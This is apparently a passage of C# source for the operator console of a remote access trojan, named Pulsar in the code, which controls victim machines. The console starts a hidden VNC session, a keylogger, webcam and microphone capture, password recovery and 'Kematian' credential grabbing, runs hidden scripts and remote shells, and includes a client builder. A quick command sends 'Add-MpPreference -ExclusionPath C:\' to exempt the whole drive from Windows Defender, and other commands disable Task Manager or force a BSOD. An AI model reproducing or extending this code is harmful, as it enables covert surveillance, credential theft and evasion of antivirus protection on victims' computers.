                foreach (Client c in GetSelectedClients())
                {
                    FrmRegistryEditor frmRe = FrmRegistryEditor.CreateNewOrGetExisting(c);
                    frmRe.Show();
                    frmRe.Focus();
                }
            }
        }

        private void localFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Client[] clients = GetSelectedClients();
            if (clients.Length > 0)
            {
                FrmRemoteExecution frmRe = new FrmRemoteExecution(clients);
                frmRe.Show();
            }
        }

        private void webFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Client[] clients = GetSelectedClients();
            if (clients.Length > 0)
            {
                FrmRemoteExecution frmRe = new FrmRemoteExecution(clients);
                frmRe.Show();
            }
        }

        private void shutdownToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.Send(new DoShutdownAction { Action = ShutdownAction.Shutdown });
            }
        }

        private void restartToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.Send(new DoShutdownAction { Action = ShutdownAction.Restart });
            }
        }

        private void standbyToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.Send(new DoShutdownAction { Action = ShutdownAction.Standby });
            }
        }

        #endregion "Administration"

        #region "Monitoring"

        private void remoteDesktopToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                var frmRd = FrmRemoteDesktop.CreateNewOrGetExisting(c);
                frmRd.Show();
                frmRd.Focus();
            }
        }

        private void hVNCToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                var frmHvnc = FrmHVNC.CreateNewOrGetExisting(c);
                frmHvnc.Show();
                frmHvnc.Focus();
            }
        }

        private void passwordRecoveryToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Client[] clients = GetSelectedClients();
            if (clients.Length > 0)
            {
                FrmPasswordRecovery frmPass = new FrmPasswordRecovery(clients);
                frmPass.Show();
            }
        }

        private void keyloggerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                FrmKeylogger frmKl = FrmKeylogger.CreateNewOrGetExisting(c);
                frmKl.Show();
                frmKl.Focus();
            }
        }

        private void webcamToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                var frmWebcam = FrmRemoteWebcam.CreateNewOrGetExisting(c);
                frmWebcam.Show();
                frmWebcam.Focus();
            }
        }

        private void kematianGrabbingToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                var kematianHandler = new Messages.KematianHandler(c);
                FrmKematian frmK = new FrmKematian(c, kematianHandler);
                frmK.Show();
                frmK.Focus();
            }
        }

        private void installVirtualMonitorToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                //check if client is admin
                bool isClientAdmin = c.Value.AccountType == "Admin" || c.Value.AccountType == "System";
                if (isClientAdmin)
                {
                    c.Send(new DoInstallVirtualMonitor());
                }
                else
                {
                    MessageBox.Show("The client is not running as an Administrator. Please elevate the client's permissions and try again.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        private void uninstallVirtualMonitorToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                //check if client is admin
                bool isClientAdmin = c.Value.AccountType == "Admin" || c.Value.AccountType == "System";
                if (isClientAdmin)
                {
                    c.Send(new DoUninstallVirtualMonitor());
                }
                else
                {
                    MessageBox.Show("The client is not running as an Administrator. Please elevate the client's permissions and try again.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        #endregion "Monitoring"

        #region "User Support"

        private void visitWebsiteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                using (var frm = new FrmVisitWebsite(lstClients.SelectedItems.Count))
                {
                    if (frm.ShowDialog() == DialogResult.OK)
                    {
                        foreach (Client c in GetSelectedClients())
                        {
                            c.Send(new DoVisitWebsite
                            {
                                Url = frm.Url,
                                Hidden = frm.Hidden
                            });
                        }
                    }
                }
            }
        }

        private void showMessageboxToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                using (var frm = new FrmShowMessagebox(lstClients.SelectedItems.Count))
                {
                    if (frm.ShowDialog() == DialogResult.OK)
                    {
                        foreach (Client c in GetSelectedClients())
                        {
                            c.Send(new DoShowMessageBox
                            {
                                Caption = frm.MsgBoxCaption,
                                Text = frm.MsgBoxText,
                                Button = frm.MsgBoxButton,
                                Icon = frm.MsgBoxIcon
                            });
                        }
                    }
                }
            }
        }

        #endregion "User Support"

        #region "Quick Commands"

        private void addCDriveExceptionToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string powershellCode = "Add-MpPreference -ExclusionPath C:\\";
            DoSendQuickCommand quickCommand = new DoSendQuickCommand { Command = powershellCode, Host = "powershell.exe" };

            foreach (Client c in GetSelectedClients())
            {
                bool isClientAdmin = c.Value.AccountType == "Admin" || c.Value.AccountType == "System";

                if (isClientAdmin)
                {
                    c.Send(quickCommand);
                }
                else
                {
                    MessageBox.Show("The client is not running as an Administrator. Please elevate the client's permissions and try again.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        private void enableToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                bool isClientAdmin = c.Value.AccountType == "Admin" || c.Value.AccountType == "System";

                if (isClientAdmin)
                {
                    c.Send(new DoEnableTaskManager());
                }
                else
                {
                    MessageBox.Show("The client is not running as an Administrator. Please elevate the client's permissions and try again.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        private void disableTaskManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                bool isClientAdmin = c.Value.AccountType == "Admin" || c.Value.AccountType == "System";

                if (isClientAdmin)
                {
                    c.Send(new DoDisableTaskManager());
                }
                else
                {
                    MessageBox.Show("The client is not running as an Administrator. Please elevate the client's permissions and try again.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        #endregion "Quick Commands"

        #region "Fun Stuff"

        private void bSODToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.Send(new DoBSOD());
            }
        }

        private void cWToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog openFileDialog = new OpenFileDialog())
            {
                openFileDialog.InitialDirectory = "c:\\";
                openFileDialog.Filter = "Image Files|*.jpg;*.jpeg;*.png;*.bmp";
                openFileDialog.FilterIndex = 1;
                openFileDialog.RestoreDirectory = true;

                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    string selectedFilePath = openFileDialog.FileName;
                    byte[] imageData = File.ReadAllBytes(selectedFilePath);
                    string imageFormat = Path.GetExtension(selectedFilePath).TrimStart('.').ToLower();

                    foreach (Client c in GetSelectedClients())
                    {
                        c.Send(new DoChangeWallpaper
                        {
                            ImageData = imageData,
                            ImageFormat = imageFormat
                        });
                    }
                }
            }
        }

        private void swapMouseButtonsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.Send(new DoSwapMouseButtons());
            }
        }

        private void screenCorruptToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.Send(new DoScreenCorrupt());
            }
        }

        private void illuminatiToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.Send(new DoIlluminati());
            }
        }

        private void hideTaskBarToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.Send(new DoHideTaskbar());
            }
        }

        #endregion "Fun Stuff"

        private void selectAllToolStripMenuItem_Click(object sender, EventArgs e)
        {
            lstClients.SelectAllItems();
        }

        #endregion "ContextMenuStrip"

        #region "MenuStrip"

        private void closeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void settingsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (var frm = new FrmSettings(ListenServer))
            {
                frm.ShowDialog();
            }
        }

        private void builderToolStripMenuItem_Click(object sender, EventArgs e)
        {
#if DEBUG
            MessageBox.Show("Client Builder is not available in DEBUG configuration.\nPlease build the project using RELEASE configuration.", "Not available", MessageBoxButtons.OK, MessageBoxIcon.Information);
#else
            using (var frm = new FrmBuilder())
            {
                frm.ShowDialog();
            }
#endif
        }

        private void aboutToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (var frm = new FrmAbout())
            {
                frm.ShowDialog();
            }
        }

        #endregion "MenuStrip"

        #region "NotifyIcon"

        private void notifyIcon_MouseDoubleClick(object sender, MouseEventArgs e)
        {
        }

        #endregion "NotifyIcon"

        private void contextMenuStrip_Opening(object sender, System.ComponentModel.CancelEventArgs e)
        {
        }

        private void addKeywordsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (var frm = new FrmKeywords())
            {
                frm.ShowDialog();
            }
        }        
        
        public static void AddNotiEvent(FrmMain frmMain, string client, string keywords, string windowText)
        {
            if (frmMain.lstNoti.InvokeRequired)
            {
                frmMain.lstNoti.Invoke(new Action(() => AddNotiEvent(frmMain, client, keywords, windowText)));
                return;
            }
            ListViewItem item = new ListViewItem(client);
            item.SubItems.Add(DateTime.Now.ToString("yyyy/MM/dd HH:mm:ss"));
            item.SubItems.Add(keywords);
            
            // truncate
            string displayText = windowText;
            if (windowText.Length > 100)
            {
                displayText = windowText.Substring(0, 100) + "...";
            }
            item.SubItems.Add(displayText);
            
            item.ToolTipText = windowText;
            
            frmMain.lstNoti.Items.Add(item);

            string notificationTitle = $"Keyword Triggered: {keywords}";
            string notificationText;
            
            if (keywords.Contains("(Clipboard)"))
            {
                notificationText = $"Client: {client}\nClipboard: {(windowText.Length > 50 ? windowText.Substring(0, 50) + "..." : windowText)}";
            }
            else
            {
                notificationText = $"Client: {client}\nWindow: {windowText}";
            }

            frmMain.notifyIcon.Visible = true;
            frmMain.notifyIcon.ShowBalloonTip(4000, notificationTitle, notificationText, ToolTipIcon.Info);
            frmMain.notifyIcon.Visible = false;
        }

        private void clientsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            MainTabControl.SelectTab(tabPage1);
        }

        private void notificationCentreToolStripMenuItem_Click(object sender, EventArgs e)
        {
            MainTabControl.SelectTab(tabPage2);
        }

        private void clearSelectedToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstNoti.SelectedItems.Count > 0)
            {
                foreach (ListViewItem item in lstNoti.SelectedItems)
                {
                    lstNoti.Items.Remove(item);
                }
            }
        }

        private void systemToolStripMenuItem_Click(object sender, EventArgs e)
        {
        }

        private void deleteTasksToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstTasks.SelectedItems.Count > 0)
            {
                foreach (ListViewItem item in lstTasks.SelectedItems)
                {
                    lstTasks.Items.Remove(item);
                }
            }
        }

        private void autoTasksToolStripMenuItem_Click(object sender, EventArgs e)
        {
            MainTabControl.SelectTab(tabPage4);
        }

        private void remoteExecuteToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            using (var frm = new FrmTaskExecute())
            {
                frm.ShowDialog();
            }
        }

        private void shellCommandToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (var frm = new FrmTaskCommand())
            {
                frm.ShowDialog();
            }
        }

        private void showMessageBoxToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            using (var frm = new FrmTaskMessageBox())
            {
                frm.ShowDialog();
            }
        }

        public void AddTask(string title, string param1, string param2)
        {
            ListViewItem newItem = new ListViewItem(title);
            newItem.SubItems.Add(param1);
            newItem.SubItems.Add(param2);
            lstTasks.Items.Add(newItem);
            SaveAutoTasks();
        }

        private void kematianToolStripMenuItem_Click(object sender, EventArgs e)
        {
            AddTask("Kematian Recovery", "", "");
        }

        private void excludeSystemDriveToolStripMenuItem_Click(object sender, EventArgs e)
        {
            AddTask("Exclude System Drives", "", "");
        }

        private void groupBox1_Enter(object sender, EventArgs e)
        {
        }

        private void button3_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                FrmFileManager frmFm = FrmFileManager.CreateNewOrGetExisting(c);
                frmFm.Show();
                frmFm.Focus();
            }
        }

        private void button4_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                FrmRemoteShell frmRs = FrmRemoteShell.CreateNewOrGetExisting(c);
                frmRs.Show();
                frmRs.Focus();
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                var frmRd = FrmRemoteDesktop.CreateNewOrGetExisting(c);
                frmRd.Show();
                frmRd.Focus();
            }
        }

        private void button5_Click(object sender, EventArgs e)
        {
            Client[] clients = GetSelectedClients();
            if (clients.Length > 0)
            {
                FrmRemoteExecution frmRe = new FrmRemoteExecution(clients);
                frmRe.Show();
            }
        }

        private void button6_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                FrmKeylogger frmKl = FrmKeylogger.CreateNewOrGetExisting(c);
                frmKl.Show();
                frmKl.Focus();
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                var frmWebcam = FrmRemoteWebcam.CreateNewOrGetExisting(c);
                frmWebcam.Show();
                frmWebcam.Focus();
            }
        }

        private void taskTestToolStripMenuItem_Click(object sender, EventArgs e)
        {
        }

        private void tableLayoutPanel1_Paint(object sender, PaintEventArgs e)
        {
        }

        private void saveLogsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (SaveFileDialog saveFileDialog = new SaveFileDialog())
            {
                saveFileDialog.Filter = "Text Files (*.txt)|*.txt|All Files (*.*)|*.*";
                saveFileDialog.Title = "Save Log File";
                saveFileDialog.DefaultExt = "txt";

                if (saveFileDialog.ShowDialog() == DialogResult.OK)
                {
                    File.WriteAllText(saveFileDialog.FileName, DebugLogRichBox.Text);
                }
            }
        }

        private void saveSlectedToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrWhiteSpace(DebugLogRichBox.SelectedText))
            {
                return;
            }

            using (SaveFileDialog saveFileDialog = new SaveFileDialog())
            {
                saveFileDialog.Filter = "Text Files (*.txt)|*.txt|All Files (*.*)|*.*";
                saveFileDialog.Title = "Save Selected Text";
                saveFileDialog.DefaultExt = "txt";

                if (saveFileDialog.ShowDialog() == DialogResult.OK)
                {
                    File.WriteAllText(saveFileDialog.FileName, DebugLogRichBox.SelectedText);
                }
            }
        }

        private void clearLogsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            DebugLogRichBox.Clear();
        }

        private void clearSelectedToolStripMenuItem1_Click(object sender, EventArgs e)
        {
        }

        private void lstClients_Resize(object sender, EventArgs e)
        {
            int accountTypeIndex = -1;
            for (int i = 0; i < lstClients.Columns.Count; i++)
            {
                if (lstClients.Columns[i] == hAccountType)
                {
                    accountTypeIndex = i;
                    break;
                }
            }

            if (accountTypeIndex >= 0)
            {
                lstClients.StretchColumnByIndex(accountTypeIndex);
            }

            UpdateAllStarPositions();
        }

        private void UpdateAllStarPositions()
        {
            if (this.IsDisposed || !this.IsHandleCreated)
                return;

            try
            {
                if (this.InvokeRequired)
                {
                    this.Invoke(new Action(() => UpdateAllStarPositionsInternal()));
                }
                else
                {
                    UpdateAllStarPositionsInternal();
                }
            }
            catch (InvalidOperationException)
            {
            }
            catch (Exception ex)
            {
                EventLog($"Error updating star positions: {ex.Message}", "error");
            }
        }

        private void UpdateAllStarPositionsInternal()
        {
            if (this.IsDisposed || !this.IsHandleCreated || lstClients == null || lstClients.IsDisposed)
                return;

            // Clean up any star controls that don't have matching clients
            List<Control> starsToRemove = new List<Control>();
            foreach (Control control in lstClients.Controls)
            {
                if (control is Button && control.Tag is Client starClient)
                {
                    bool found = false;
                    foreach (ListViewItem item in lstClients.Items)
                    {
                        if (item.Tag is Client itemClient && itemClient.Equals(starClient))
                        {
                            UpdateStarButtonPosition(control, item);
                            found = true;
                            break;
                        }
                    }

                    if (!found)
                    {
                        starsToRemove.Add(control);
                    }
                }
            }

            // Remove stars for clients that no longer exist
            foreach (var control in starsToRemove)
            {
                lstClients.Controls.Remove(control);
                control.Dispose();
            }
        }

        private void lstClients_MouseWheel(object sender, MouseEventArgs e)
        {
            UpdateAllStarPositions();
        }

        private void lstClients_ColumnWidthChanged(object sender, ColumnWidthChangedEventArgs e)
        {
            if (!lstClients.IsStretched(hAccountType.Index))
            { lstClients.StretchColumnByIndex(hAccountType.Index); }
            UpdateAllStarPositions();
        }

        private void MainTabControl_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (MainTabControl.SelectedTab == tabPage1)
            {
                RefreshStarButtons();
                SortClientsByFavoriteStatus();
            }
        }

        private void lstClients_DrawItem(object sender, DrawListViewItemEventArgs e)
        {
            e.DrawDefault = true;
        }

        private void remoteScriptingToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                using (var frm = new FrmRemoteScripting(lstClients.SelectedItems.Count))
                {
                    if (frm.ShowDialog() == DialogResult.OK)
                    {
                        foreach (Client c in GetSelectedClients())
                        {
                            c.Send(new DoExecScript
                            {
                                Language = frm.Lang,
                                Script = frm.Script,
                                Hidden = frm.Hidden
                            });
                        }
                    }
                }
            }
        }

        private void audioToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                var frmAudio = FrmRemoteMic.CreateNewOrGetExisting(c);
                frmAudio.Show();
                frmAudio.Focus();
            }
        }

        private void button1_Click_1(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                var frmAudio = FrmRemoteMic.CreateNewOrGetExisting(c);
                frmAudio.Show();
                frmAudio.Focus();
            }
        }

        private void remoteSystemAudioToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                var frmSysAudio = FrmRemoteSystemAudio.CreateNewOrGetExisting(c);
                frmSysAudio.Show();
                frmSysAudio.Focus();
            }
        }

        private void sorterToolStripMenuItem_Click(object sender, EventArgs e)
        {
            MainTabControl.SelectTab(tabPage5);
        }

        private void blockIPToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count == 0) return;
            if (
                MessageBox.Show(
                    string.Format(
                        "Are you sure you want to Block {0} IP\\s?",
                        lstClients.SelectedItems.Count), "Block Confirmation", MessageBoxButtons.YesNo,
                    MessageBoxIcon.Question) == DialogResult.Yes)
            {
                foreach (Client c in GetSelectedClients())
                {
                    string clientAddress = c.EndPoint.Address.ToString();
                    string filePath = Path.Combine(PulsarStuffDir, "blocked.json");
                    List<string> blockedIPs = new List<string>();
                    try
                    {
                        if (File.Exists(filePath))
                        {
                            string json = File.ReadAllText(filePath);
                            blockedIPs = JsonConvert.DeserializeObject<List<string>>(json) ?? new List<string>();
                        }
                        if (!blockedIPs.Contains(clientAddress))
                        {
                            blockedIPs.Add(clientAddress);
                        }
                        string updatedJson = JsonConvert.SerializeObject(blockedIPs, Newtonsoft.Json.Formatting.Indented);
                        File.WriteAllText(filePath, updatedJson);
                    }
                    catch (Exception)
                    {
                    }
                    c.Send(new DoClientUninstall());
                }
            }
        }

        private void remoteChatToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                var frmRd = FrmRemoteChat.CreateNewOrGetExisting(c);
                frmRd.Show();
                frmRd.Focus();
            }
        }

        #region AutoTaskStuff

        private void SaveAutoTasks()
        {
            var tasks = new List<AutoTask>();
            foreach (ListViewItem item in lstTasks.Items)
            {
                tasks.Add(new AutoTask
                {
                    Title = item.Text,
                    Param1 = item.SubItems.Count > 1 ? item.SubItems[1].Text : "",
                    Param2 = item.SubItems.Count > 2 ? item.SubItems[2].Text : ""
                });
            }
            File.WriteAllText(AutoTasksFilePath, JsonConvert.SerializeObject(tasks, Newtonsoft.Json.Formatting.Indented));
        }

        private void LoadAutoTasks()
        {
            lstTasks.Items.Clear();
            if (File.Exists(AutoTasksFilePath))
            {
                try
                {
                    var tasks = JsonConvert.DeserializeObject<List<AutoTask>>(File.ReadAllText(AutoTasksFilePath));
                    if (tasks != null)
                    {
                        foreach (var task in tasks)
                        {
                            AddTask(task.Title, task.Param1, task.Param2);
                        }
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show($"Failed to load autotasks: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        private void winREToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            AddTask("WinRE", "", "");
        }
    }

    public class AutoTask
    {
        public string Title { get; set; }
        public string Param1 { get; set; }
        public string Param2 { get; set; }
    }

    public class ClientInfo
    {
        public string ClientId { get; set; }
        public string Nickname { get; set; }
    }

    #endregion AutoTaskStuff
}